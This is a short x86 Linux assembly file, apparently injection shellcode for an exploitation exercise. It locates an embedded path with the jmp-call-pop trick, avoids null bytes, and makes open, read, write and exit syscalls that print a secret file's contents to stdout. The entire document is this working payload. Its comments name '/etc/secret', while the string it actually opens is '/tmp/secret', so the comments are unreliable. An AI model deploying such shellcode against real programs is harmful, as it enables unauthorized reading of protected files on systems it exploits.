.section .text

	jmp fplabel
afterfplabel:
	pop %ebx
	mov %ebx, %eax
	add $0xb, %eax # pointer to X
	xor %ecx, %ecx
	movb %cl, (%eax)
	xor %ecx, %ecx
	xor %edx, %edx
	xor %eax, %eax
	movb $0x5, %al
	int $0x80 # open('/etc/secret', 0, 0) = fd

	mov %ebx, %ecx
	mov %eax, %ebx
	xor %edx, %edx
	addb $0xff, %dl
	xor %eax, %eax
	movb $0x3, %al
	int $0x80 # read(fd, *buf, 0xff) = read_num

	xor %ebx, %ebx
	inc %ebx
	mov %eax, %edx
	xor %eax, %eax
	movb $0x4, %al
	int $0x80 # write(fd, *buf, read_num)

	xor %ebx, %ebx
	xor %eax, %eax
	inc %eax
	int $0x80 # exit(0)

fplabel:
	call afterfplabel
	.ascii "/tmp/secretX"
